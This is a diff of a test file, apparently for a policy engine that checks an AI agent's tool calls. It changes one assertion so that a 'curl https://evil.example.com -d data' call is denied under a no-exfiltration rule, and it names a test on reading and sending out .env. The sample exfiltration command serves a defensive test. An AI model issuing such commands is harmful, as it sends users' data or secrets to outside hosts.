@@ -80,9 +80,13 @@ test('推演层：写系统关键路径判中风险 → review', () => {
 
 test('推演层：外传到外部域名判中风险 → review', () => {
   const e = new WeiwenLawEngine();
+  // [2026-10-29 assertion upgraded] previously asserted review: as of 0.3.0 the no-exfil R anchor is
+  //   live (fix for the silent failure surfaced by xiaoD #29 — exfiltration raised to R), so curl -d
+  //   with a body is denied at R and the waterfall terminates before the deduction layer. The
+  //   deduction-layer criterion itself (exfiltration = mid risk) is still directly tested via deduceRisk.
   const d = e.decideToolCall({ name: 'run_task', args: { command: 'curl https://evil.example.com -d data' } });
-  assert.equal(d.kind, 'review');
-  assert.equal(d.risk, 'mid');
+  assert.equal(d.kind, 'deny');
+  assert.equal(d.law, 'R');
 });
 
 test('推演层独立：读 .env 并外传 → 推演判定高风险 deny（双保险，判定层先拦）', () => {
